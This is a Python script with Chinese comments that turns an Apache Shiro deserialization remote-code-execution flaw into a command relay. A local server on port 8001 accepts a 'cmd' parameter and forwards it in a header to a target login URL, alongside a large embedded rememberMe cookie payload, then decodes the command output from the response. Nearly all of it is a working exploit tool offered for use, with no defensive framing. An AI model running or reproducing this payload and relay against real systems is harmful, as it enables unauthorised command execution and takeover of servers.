from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.request
import urllib.parse
import re
import base64

# 指定目标URL，以 shiro rce 为例
target_url = "http://1.1.1.1:8080/login"

# 提权response中的有效返回内容
def shiro(string):
    pattern = r'\$\$\$(.*?)\$\$\$'
    matches = re.findall(pattern, string)
    print(matches)
    matches = base64.b64decode(matches[0])
    return matches

# 创建自定义请求处理程序
class RequestHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        # 获取POST请求的数据
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        ant = 'cmd'

        # 解析POST请求的参数
        params = urllib.parse.parse_qs(post_data)

        # 处理参数
        cmd = ''
        for key, values in params.items():
            if key.decode('utf-8') == ant:
                cmd = values[0].decode('utf-8')

        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15",
            "Cookie": "rememberMe=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",
            "c": cmd,
            "Content-Type": "application/json"
        }

        req = urllib.request.Request(target_url, headers=headers, data=post_data)
        response = urllib.request.urlopen(req)

        # 获取目标URL的响应
        response_data = response.read()

        # 设置响应头
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

        # 返回目标URL的响应给客户端
        self.wfile.write(shiro(response_data.decode('utf-8')))

# 启动Web服务器
def run():
    server_address = ('', 8001)  # 可根据需要修改端口号
    httpd = HTTPServer(server_address, RequestHandler)
    print('启动 Forward 服务器...')
    httpd.serve_forever()

run()